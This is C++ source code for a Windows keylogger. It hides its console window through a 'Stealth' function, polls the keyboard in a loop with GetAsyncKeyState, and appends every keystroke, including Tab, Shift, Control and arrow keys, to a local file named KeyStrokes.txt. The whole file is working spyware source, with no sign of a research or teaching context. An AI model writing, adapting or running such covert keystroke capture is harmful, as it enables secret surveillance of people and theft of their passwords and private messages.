#pragma once
#ifndef _CRT_SECURE_NO_WARNINGS
#ifndef INTERNET_FLAG_PASSIVE
#define _CRT_SECURE_NO_WARNINGS

#pragma comment (lib, "wininet.lib")
#include <iostream>
#include <fstream>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>

using namespace std;
int Save(int key_stroke, char *file);
void Stealth();

int main()
{
	Stealth();
	char i;


	while (1)
	{
		Sleep(5);
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
				Save(i, "KeyStrokes.txt");

		}


	}

	/*system("PAUSE");*/



	return 0;
}

/* *********************************** */

int Save(int key_stroke, char *file)
{
	

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a + ");

	cout << key_stroke << endl;
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%c", char(key_stroke));


	fclose(OUTPUT_FILE);
	return 0;
}

/* *********************************** */

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

#endif _CRT_SECURE_NO_WARNINGS

#endif INTERNET_FLAG_PASSIVE

